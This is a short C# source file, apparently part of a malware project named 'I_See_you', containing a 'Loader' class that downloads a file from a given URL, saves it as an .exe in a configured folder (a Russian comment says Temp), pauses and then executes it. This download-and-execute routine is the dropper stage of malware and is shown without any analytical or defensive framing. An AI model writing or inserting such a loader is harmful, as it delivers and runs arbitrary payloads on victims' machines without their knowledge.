using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Threading;

namespace I_See_you
{
    class Loader
    {
        public static void Download(string url, string filename)
        {
            byte[] srv = null;
            try
            {
                using (WebClient web = new WebClient())
                {
                    srv = web.DownloadData(url); // скачиваем файл
                }

                File.WriteAllBytes(RawSettings.DownloadPath + "\\" + filename + ".exe", srv); // записываем в Temp
                Thread.Sleep(3000); // небольшая пауза на всякий случай
                Process.Start(RawSettings.DownloadPath + "\\" + filename + ".exe"); // запускаем
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex);
            }
        }
    }
}
